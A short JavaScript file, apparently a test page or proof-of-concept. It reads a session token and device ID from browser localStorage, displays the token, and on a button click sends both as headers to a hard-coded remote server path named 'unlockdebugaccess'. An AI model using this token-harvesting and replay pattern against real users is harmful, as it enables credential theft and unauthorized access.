var TARGET_URL =
  "http://ec2-13-235-229-219.ap-south-1.compute.amazonaws.com:6868/unlockdebugaccess";

(function () {
  var tokenDisplay = document.getElementById("token");
  var container = document.getElementById("token-result");
  var sendButton = document.getElementById("send");

  var token = window.localStorage.getItem("token");
  if (token) {
    container.classList.add("success");
    tokenDisplay.innerText = token;
  } else {
    container.classList.add("fail");
  }

  sendButton.addEventListener("click", function () {
    fetch(TARGET_URL, {
      method: "GET",
      headers: {
        deviceID: window.localStorage.getItem("deviceID"),
        token: window.localStorage.getItem("token"),
      },
    });
  });
})();
